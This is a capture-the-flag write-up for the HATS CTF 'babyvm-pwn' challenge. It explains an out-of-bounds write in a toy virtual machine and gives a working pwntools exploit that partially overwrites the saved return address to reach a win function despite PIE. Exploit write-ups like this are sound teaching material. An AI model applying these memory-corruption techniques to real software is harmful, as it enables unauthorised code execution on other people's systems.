---
title: "babyvm-pwn [500]"
tags: [HATS CTF, Binary Exploitation]
excerpt: "Binary Exploitation"
layout: single
classes: wide
--- 

**Category:** Binary Exploitation

> Now the vm is hosted on a server, i feel like there is something hidden in the server too...  
> 
> nc challs.hats.sg 1308

Hint:  
> Can you modify the return pointer?

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/HATS%20CTF/Binary%20Exploitation/babyvm-pwn%20%5B500%5D){: .btn .btn--primary}

## Write-up
Before reading this writeup, I suggest reading the writeup for **[babyvm-re [500]](/babyvm-re/)** if you have not done so. The explanation of source code and "reversing part" of the challenge is explained there.

We start by running `checksec` on the binary:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Note that both ASLR and PIE are enabled. ASLR randomizes the address of the stack, heap and libc, while PIE randomizes the address of .text section by initializing a random offset everytime the binary is run. This means the address of user defined functions in code, such as **win** or **main**, will not be fixed.

Here are the important parts of the source code:

**vmstep** function:
```c
int vmstep(char op,char* stack){
    switch(op | 0x20){
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
            ax = (op | 0x20) - 0x30;
            break;
        case 'a':
            ax += stack[sp];
            break;
        case 'd':
            --ax;
            break;
        case ' ':
        case 'e':
            return 0;
        case 'i':
            ++ax;
            break;
        case 'j':
            ip += ax - 1;
            break;
        case 'm':
            ax *= stack[sp];
            break;
        case 'p':
            printf("%c",stack[sp]);
            break;
        case 'r':
            sp = ax;
            break;
        case 's':
            ax -= stack[sp];
            break;
        case 'u':
            stack[sp] = ax;
            break;
        case 'z':
            if(stack[sp] == 0){
                ip += ax - 1;
            }
            break;
        default:
            break;
    }
    return 1;
}
```

Part of the code in **main**:
```c
    char key[101]={},
         stack[101]={},
         input[1337]={},
         code1[] = "2u4mmimmiup2u6mimimimup2u7mmimmup2u6mmimmiup2u7mmmimup2u4mmmup2u7mmimmup2u6mimmmup2u6mmimmiup2u4mmmup2u6mimmimiup2u6mmimmiup2u7mimmmiup2u5mup",
         code2[] = "2u5mmimimup2u6mmimmiup2u7mmmimup2u6mimmmiup2u6mmimimup2u7mimmmiup2u6mimmmiup2u6mimimimup2u6mmimimiup2u5mup",
         code3[] = "0r2u6mmr2u6mmimmiu0r2u5mimir2u5mmmu0r2u5mimr2u4mmmiu0r2u5mmir2u5mmmimiu0r2u5mmr2u4mimmiu0r2u4mimir2u7mimu0r2u4mimr2u6mmmmu0r2u4mmir2u4mimimimu0r2u4mmr2u5mimimimu0r2u7mir2u6mmimimu0r2u7mr2u5mimmmu0r2u6mir2u5mmmimu0r2u6mr2u5mmmiu0r2u5mir2u4mimimu0r2u5mr2u5mmimmiu9r2u5mmimu8r2u6mimmimu7r2u5mimmmu6r2u6mmimimiu5r2u7mmmmiu4r2u7mmimimiu3r2u5mmmmu2r2u5mmmimu1r2u4mmmmu0r2u4mimmmu",
         code4[] = "2u5mmimimiup2u7mmmimup2u6mimimimiup2u6mimimimup2u6mmimimiup2u4mmmup2u6mimmimiup2u6mmimmiup2u7mimmmiup2u4mmmiup2u5mup",
         code5[] = "2u4mmimimup2u6mimimmup2u6mmmmiup2u6mmimimiup2u4mmmup2u7mmimup2u4mmmup";
    int i;
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    vmexec(code1,stack);
    scanf("%1337s", &input);
    vmexec(code2,stack);
    vmexec(input,key);
    vmexec(code3,stack);
```

The challenge has a vulnerability similar to a buffer overflow. The statement `vmexec(input,key);` allows us to write instructions to overwrite values in the `key` buffer. However, as **vmstep** does not check `ax` to ensure its value is within range of the buffer, we are essentially able to overwrite any location in memory relative to the location of `key` in memory. 

These instructions are essential to exploiting the vulnerability:
* `0` sets the value of `ax` to 0.
* `d` decreases the value of `ax` by 1.
* `i` increases the value of `ax` by 1.
* `r` sets the value of `sp` to the value of `ax`. Basically, `sp = ax`.
* `a` adds the value at `stack[sp]` to `ax`. Basically, `ax += stack[sp]`.
* `u` sets the value at `stack[sp]` to the value of `ax`. Basically, `stack[sp] = ax`.

Here's an example to help you visualize the vulnerability. If the input contains: 
```python 
'0' + 'i'*999 + 'ru'
```
We would overwrite `key[999]` with the value 999. As seen in the example, we are able to overwrite any area in memory as long as our payload is not more than 1337 characters.

The exploit works by overwriting the return instruction pointer (RIP) with the address of **win**, which would give us a shell. Developing the exploit has 3 stages:

1. **Finding the offset of RIP**  
We can find the offset of RIP from the `key` buffer by a trial and error process. This can be done by overwriting every value up to a certain offset and using gdb to check if RIP is overwritten. We increase the offset if gdb is not overwritten, and decrease if it is overwritten. Keep in mind that the address of RIP would be smaller than the address of `key`, hence the offset should be negative.

2. **Calculating the address of win**  
Due to PIE, the address of **win** will change everytime the binary is run. This means that the base offset of the address will change and only the last 2 bytes are known.   

   Luckily for us, when we overwrite RIP, it contains the address of `main + 1501`. This means we only have to overwrite the last 2 bytes of RIP to call **win**, thus bypassing PIE. The last byte of **win**, which is fixed, is 0xa1. We can calculate the second last byte using `offset = (saved_rip - win) >> 8`, where `saved_rip` is the address of `main + 1501` and `win` is the address of **win**. This works as the difference between **win** and `main + 1501` is constant regardless of PIE.

3. **Overwriting RIP with the address of win**  
An offset of 103 overwrites the second last byte of RIP while 104 overwrites the last byte. The following code overwrites the last 2 bytes of RIP to become the address of **win**:
   ```python
    payload = '0' + 'd'*103 + 'r' + "0au" + 'd'*offset + 'u'
    payload += '0' + 'd'*104 + 'r' + '0' + 'i'*0xa1 + 'u'
   ```    

Here's the final exploit used to solve the challenge:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./chal",
    #"libc" : "./",
    #"ld" : "./",
    "HOST" : "challs.hats.sg",
    "PORT" : 1308,
}

def exploit(p):
    win = elf.symbols['win']
    saved_rip = elf.symbols['main']+1501
    offset = (saved_rip - win) >> 8

    payload = '0' + 'd'*103 + 'r' + "0au" + 'd'*offset + 'u'
    payload += '0' + 'd'*104 + 'r' + '0' + 'i'*0xa1 + 'u'
  
    sla("Enter the key\n", payload)
    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

**Flag:** HATS{vm5_4r3_c00l_4r3n7_7h3y}